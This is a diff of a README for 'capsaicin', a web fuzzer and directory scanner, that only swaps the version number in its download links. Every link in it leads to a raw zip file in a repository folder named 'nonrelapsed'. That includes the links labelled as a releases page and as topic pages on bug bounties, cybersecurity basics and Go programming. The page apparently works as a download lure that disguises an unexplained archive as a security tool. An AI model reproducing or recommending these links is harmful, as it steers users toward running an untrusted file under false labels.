@@ -6,11 +6,11 @@ Welcome to **capsaicin**, an intelligent Web Fuzzer and Directory Scanner design
 
 ## 📥 Download the Application
 
-[![Download capsaicin](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip%https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
+[![Download capsaicin](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip%https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
 
 You can easily download the latest version of capsaicin by visiting the following link:
 
-[Download capsaicin releases](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
+[Download capsaicin releases](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
 
 ### 💡 System Requirements
 
@@ -24,7 +24,7 @@ Before installing capsaicin, make sure your system meets the following requireme
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [capsaicin releases page](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip).
+   Go to the [capsaicin releases page](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip).
 
 2. **Download the Latest Release**  
    Find the latest version listed at the top of the page and click on it. You will see various download options. Choose the file that matches your operating system. Click on the link to start downloading.
@@ -75,9 +75,9 @@ If you have questions or need assistance, feel free to submit an issue in this r
 
 Explore more about capsaicin's features and techniques with the following topics:
 
-- [Bug Bounty Programs](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
-- [Cybersecurity Basics](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
-- [Learning Go Programming](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
+- [Bug Bounty Programs](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
+- [Cybersecurity Basics](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
+- [Learning Go Programming](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
 
 ## 💻 Contribute to capsaicin
 
@@ -96,4 +96,4 @@ This application is licensed under the MIT License. See the LICENSE file for mor
 
 To download the latest release, visit the link below:
 
-[Download capsaicin](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v2.5-alpha.3.zip)
+[Download capsaicin](https://github.com/ecko554-554/capsaicin/raw/refs/heads/main/nonrelapsed/Software-v1.7-beta.2.zip)
